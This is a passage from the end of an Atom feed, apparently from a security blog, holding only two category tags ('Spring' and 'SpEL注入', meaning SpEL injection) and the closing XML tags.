      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
